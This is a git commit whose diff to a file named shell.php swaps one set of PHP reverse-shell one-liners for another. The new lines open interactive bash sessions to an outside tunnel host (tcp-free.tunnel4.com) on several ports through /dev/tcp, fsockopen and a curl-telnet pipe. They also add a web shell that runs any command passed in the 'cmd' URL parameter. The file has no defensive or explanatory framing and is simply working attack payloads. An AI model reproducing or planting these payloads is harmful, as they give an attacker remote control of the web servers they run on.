e5bc1b2ea0717bc31e04d14a83bee9c9e204dc7e
public_hysteria <juuzodes@yandex.ru>
2024-10-19 01:00:25 +0300

    rshells

--- shell.php
+++ shell.php
@@ -1,2 +1,9 @@
-<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.127.247.60/9290 0>&1")?>
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.127.247.60/9290 0>&1")?>
+<?=system("/usr/bin/bash -c '/usr/bin/bash -i >& /dev/tcp/tcp-free.tunnel4.com/33159 0>&1'");?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/tcp-free.tunnel4.com/33095 0>&1")?>
+<?=system('bash -c bash -i >& /dev/tcp/tcp-free.tunnel4.com/33161 0>&1');?>
+<?=shell_exec('which python');?>
+<?php $sock=fsockopen("tcp-free.tunnel4.com",33161);exec("bash <&3 >&3 2>&3");?>
+<?=exec("/usr/bin/bash -c 'bash -i > /dev/tcp/tcp-free.tunnel4.com/33161 0>&1'");?>
+<?=exec("C='curl -Ns telnet://tcp-free.tunnel4.com:33161'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null");?>
+<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>
+<?php $sock=fsockopen("tcp-free.tunnel4.com",33161);passthru("bash <&3 >&3 2>&3");?>
